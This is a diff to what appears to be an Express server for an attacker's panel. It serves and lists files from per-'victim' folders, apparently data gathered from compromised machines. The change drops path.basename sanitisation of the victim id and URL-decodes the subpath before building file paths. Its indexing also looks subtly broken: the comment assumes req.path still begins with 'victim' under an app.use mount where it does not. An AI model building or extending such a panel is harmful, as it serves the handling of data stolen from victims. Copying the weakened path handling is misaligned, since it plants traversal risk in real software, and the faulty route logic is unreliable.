@@ -91,12 +91,17 @@ app.get("/victim/:id", async (req, res) => {
   );
 });
 
-// --- Browse victim files / Download (handles both folders and files) ---
-app.get("/victim/:id/:path(.*)", async (req, res) => {
-  const safeId = path.basename(req.params.id);
-  const subPath = req.params.path || "";
+// --- Handle all /victim/ paths (subfolders and files) ---
+app.use("/victim/", async (req, res, next) => {
+  // Skip if it's just /victim/ or /victim/:id (handled by other routes)
+  const parts = req.path.slice(1).split("/").filter(Boolean); // ['victim', 'id', 'subpath...']
+  if (parts.length < 2) return next();
+  
+  const safeId = parts[1]; // victim id
+  const subPath = parts.slice(2).join("/") || ""; // rest of path
+  
   const victimDir = path.join(VICTIMS_DIR, safeId);
-  const fullPath = path.join(victimDir, subPath);
+  const fullPath = path.join(victimDir, decodeURIComponent(subPath));
 
   // Security check
   if (!fullPath.startsWith(victimDir)) {
